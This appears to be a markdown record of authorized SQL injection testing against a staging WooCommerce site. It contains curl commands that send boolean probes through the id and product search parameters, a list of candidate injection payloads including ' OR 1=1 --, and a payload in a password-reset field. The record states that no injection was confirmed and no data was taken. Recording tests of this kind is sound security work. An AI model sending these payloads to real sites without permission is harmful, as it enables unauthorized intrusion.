# Commands and payloads discussed

These are documentation examples, not an automatically executed scanner. Set `STAGING_BASE` to the explicitly authorized staging origin. Commands here were reconstructed from the chat; execution status is recorded below. No database enumeration or destructive payload was executed in this record.

## Observed in supplied terminal evidence

```bash
STAGING_BASE='https://your-authorized-staging.example'

# /products was an unverified example and returned 404.
curl -sS -G "$STAGING_BASE/products" --data-urlencode 'id=12' -o baseline.html

# Homepage requests; id was not established as a real selector.
curl -sS -G "$STAGING_BASE/" --data-urlencode 'id=12' -o baseline.html
curl -sS -G "$STAGING_BASE/" --data-urlencode 'id=12 AND 1=1' -o true.html
curl -sS -G "$STAGING_BASE/" --data-urlencode 'id=12 AND 1=2' -o false.html
diff -u baseline.html true.html
diff -u true.html false.html

# Inspect, then follow, the true-condition redirect.
curl -sS -G "$STAGING_BASE/" --data-urlencode 'id=12 AND 1=1' -D - -o /dev/null
curl -sS -L --max-redirs 5 -G "$STAGING_BASE/"   --data-urlencode 'id=12 AND 1=1' -o followed.html   -w 'Final status: %{http_code}\nFinal URL: %{url_effective}\nRedirects: %{num_redirects}\nBytes: %{size_download}\n'
```

`-G` puts the encoded parameters in a GET query; `--data-urlencode` performs URL encoding; `-o` saves the body; `-D` saves/displays response headers; `-L` follows redirects. Neither curl nor HTTP 200 implies database execution. Quote local paths containing spaces when using `cd`.

## Product search — user reported baseline and first pair results

```bash
mkdir -p sqli-search-check
cd sqli-search-check
search_check() {
  curl -sS -L --max-redirs 5 --max-time 30     -G "$STAGING_BASE/"     --data-urlencode "s=$2"     --data-urlencode 'post_type=product'     --data-urlencode 'dgwt_wcas=1'     -D "$1.headers.txt" -o "$1.html"     -w "$1: HTTP %{http_code} | Bytes %{size_download} | Redirects %{num_redirects}\n"
}
search_check baseline 'vitamin'
search_check true "vitamin' AND 1=1 -- "
search_check false "vitamin' AND 1=2 -- "
```

Reported result: baseline products; both probes no products. This is not a demonstrated boolean distinction.

## Additional suggestions — execution/outcomes not established

```text
vitamin'
vitamin"
vitamin' AND '1'='1' --
vitamin' AND '1'='2' --
vitamin') AND ('1'='1') --
vitamin') AND ('1'='2') --
```

These candidates assume different quoting/parenthesis contexts; no universal payload exists. The trailing space after `--` is intentional. Identical no-results responses can reflect literal search handling. Different results can also arise from ordinary search semantics.

The linked guide's generic examples (`' OR 1=1 --`, `' OR 1=2 --`, `' AND 1=1 --`, `' AND 1=2 --`) were discussed, not all independently executed. Time-based techniques were explained conceptually; no timing-based SQL injection was demonstrated. No schema enumeration, data extraction, privilege escalation, file access, or RCE was performed in the supplied record.

## Password reset — screenshot evidence only

```text
user_login = test@test.com' AND '1'='2'-- -
_xoo_el_form = lostPassword
action = xoo_el_form_action
display = popup
```

Response: HTTP 200, application error 1, invalid username/email. The screenshot does not expose the complete request path or provide matched control requests. No reset replay command is invented here.
